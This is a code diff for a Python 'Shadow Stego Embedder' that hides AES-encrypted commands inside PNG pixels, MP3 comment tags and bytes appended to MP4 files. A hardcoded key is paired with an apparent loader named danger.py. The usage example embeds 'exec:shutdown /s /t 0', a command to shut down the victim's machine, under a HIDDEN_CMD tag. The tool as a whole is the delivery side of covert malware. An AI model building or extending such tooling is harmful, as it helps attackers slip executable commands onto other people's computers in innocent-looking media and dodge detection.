@@ -1,13 +1,29 @@
 import base64
 from PIL import Image
-from mutagen.easyid3 import EasyID3
-from mutagen.mp3 import MP3
 import shutil
+from Crypto.Cipher import AES
+from Crypto.Util.Padding import pad
+
+# AES key (must match danger.py)
+KEY = b"1234567812345678"
+
+def encrypt_payload(payload):
+    """Encrypt payload with AES and return base64"""
+    cipher = AES.new(KEY, AES.MODE_ECB)
+    padded_data = pad(payload.encode(), AES.block_size)
+    encrypted = cipher.encrypt(padded_data)
+    return base64.b64encode(encrypted).decode()
 
 def embed_png(input_image, output_image, secret_data):
-    secret_data += "EOF"
-    binary_data = ''.join([format(ord(i), '08b') for i in secret_data])
+    # Encrypt the payload first
+    encrypted_data = encrypt_payload(secret_data)
+    encrypted_data += "EOF"
+    binary_data = ''.join([format(ord(i), '08b') for i in encrypted_data])
+
     img = Image.open(input_image)
+    if img.mode != 'RGB':
+        img = img.convert('RGB')
+
     pixels = list(img.getdata())
     new_pixels = []
     data_index = 0
@@ -27,20 +43,35 @@ def embed_png(input_image, output_image, secret_data):
 
     img.putdata(new_pixels)
     img.save(output_image)
-    print(f"[PNG] : {output_image}")
+    print(f"[✅] Embed tugadi: {output_image}")
+
+from mutagen.id3 import ID3, COMM, ID3NoHeaderError
 
 def embed_mp3(input_file, output_file, secret_data):
+    # Encrypt the payload first
+    encrypted_data = encrypt_payload(secret_data)
+    
     shutil.copy(input_file, output_file)
-    audio = MP3(output_file, ID3=EasyID3)
-    audio['comment'] = secret_data
-    audio.save()
-    print(f"[MP3] : {output_file}")
+    try:
+        audio = ID3(output_file)
+    except ID3NoHeaderError:
+        audio = ID3()
+    audio.add(COMM(encoding=3, lang='eng', desc='desc', text=encrypted_data))
+    audio.save(output_file)
+    print(f"[✅ MP3] Yashirish tugadi: {output_file}")
+
 
 def embed_mp4(input_file, output_file, secret_data):
-    with open(input_file, "rb") as f:content = f.read()
-    tag = f"\nHIDDEN_CMD:{secret_data}\n".encode()
-    with open(output_file, "wb") as f:f.write(content + tag)
-    print(f"[MP4] : {output_file}")
+    # Encrypt the payload first
+    encrypted_data = encrypt_payload(secret_data)
+    
+    with open(input_file, "rb") as f:
+        content = f.read()
+    tag = f"HIDDEN_CMD:{encrypted_data}".encode()
+    with open(output_file, "wb") as f:
+        f.write(content + tag)
+    print(f"[✅ MP4] Yashirish tugadi: {output_file}")
+
 
 import argparse
 import sys
@@ -54,13 +85,13 @@ def main():
 """
     parser = argparse.ArgumentParser(
         description="Shadow Stego Embedder: Hide AES-encrypted base64 payloads inside PNG, MP3, or MP4 files.",
-        epilog="Example: python3 embed_stego.py -f png -i clear.png -o stego.png -s ZXhlYzpzaHV0ZG93biAvcyAvdCAw",
+        epilog="Example: python3 embed_stego.py -f png -i clear.png -o stego.png -s 'exec:shutdown /s /t 0'",
         add_help=True
     )
     parser.add_argument("-f", "--format", type=str, help="Format: png / mp3 / mp4", required=False)
     parser.add_argument("-i", "--input", type=str, help="Input media file", required=False)
     parser.add_argument("-o", "--output", type=str, help="Output stego file", required=False)
-    parser.add_argument("-s", "--secret", type=str, help="AES+base64 encoded secret payload", required=False)
+    parser.add_argument("-s", "--secret", type=str, help="Secret payload (will be AES encrypted)", required=False)
 
     args = parser.parse_args()
     
